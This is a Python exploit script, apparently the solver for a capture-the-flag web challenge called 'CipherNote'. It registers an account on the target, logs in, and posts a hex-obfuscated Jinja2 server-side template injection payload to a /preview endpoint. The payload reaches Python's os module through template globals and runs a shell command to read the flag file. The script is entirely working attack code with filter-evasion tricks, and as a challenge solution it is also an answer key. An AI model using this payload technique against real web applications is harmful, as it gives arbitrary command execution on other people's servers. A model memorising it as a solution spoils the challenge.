import requests
import sys
import re
import platform

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5000"

s = requests.Session()

print("[*] CipherNote SSTI Exploit")
print(f"[*] Target: {BASE_URL}")

print("[+] Registering account...")
s.post(f"{BASE_URL}/register", data={
    "username": "solver_user",
    "password": "solver_pass"
}, allow_redirects=True)

print("[+] Logging in...")
resp = s.post(f"{BASE_URL}/login", data={
    "username": "solver_user",
    "password": "solver_pass"
}, allow_redirects=True)

if "dashboard" not in resp.url and "Dashboard" not in resp.text:
    print("[-] Login may have failed, continuing anyway...")

is_windows = platform.system() == "Windows"
cmd = "type fla*.txt" if is_windows else "cat /fla*.txt"
cmd_encoded = cmd.replace("o", "\\x6f") if "o" in cmd else cmd

payload = (
    "{%print(lipsum|attr('\\x5f\\x5fgl\\x6f\\x62al\\x73\\x5f\\x5f')"
    "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5f\\x62uiltins\\x5f\\x5f')"
    "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimp\\x6frt\\x5f\\x5f')('\\x6f\\x73')"
    f"|attr('p\\x6fpen')('{cmd_encoded}')"
    "|attr('re\\x61d')())%}"
)

print(f"[+] Sending SSTI payload via /preview (cmd: {cmd})...")
r = s.post(f"{BASE_URL}/preview", data={"content": payload})

if r.status_code == 200:
    data = r.json()
    html = data.get("html", "")
    match = re.search(r"(\w+\{[^}]+\})", html)
    if match:
        flag = match.group(1)
        print(f"\n[✓] FLAG CAPTURED: {flag}\n")
    else:
        print("[!] SSTI executed but flag pattern not found in response.")
        print(f"[*] Response: {html[:500]}")
else:
    print(f"[-] Request failed with status {r.status_code}")
    print(f"[*] Response: {r.text[:500]}")
